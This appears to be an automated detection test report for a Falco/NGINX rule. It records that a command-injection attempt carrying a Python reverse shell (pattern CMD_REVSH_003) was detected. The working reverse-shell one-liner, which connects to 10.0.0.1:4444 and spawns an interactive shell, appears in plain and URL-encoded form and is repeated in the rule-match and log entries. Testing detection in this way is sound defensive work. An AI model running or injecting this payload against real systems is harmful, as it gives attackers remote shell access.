name: test_e2e_with_logs[366_CMD_REVSH_003]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_003` |
| **Name** | Python reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
- **Encoded**: `python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 20:31:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1770841878848-8nx8m pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1770841878848-8nx8m pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1

**Falco Log Entry**:
```
20:31:18.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_003-1770841878848-8nx8m pattern_id=CMD_REVSH_003 uri=/?q=python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)' client=127.0.0.1
```
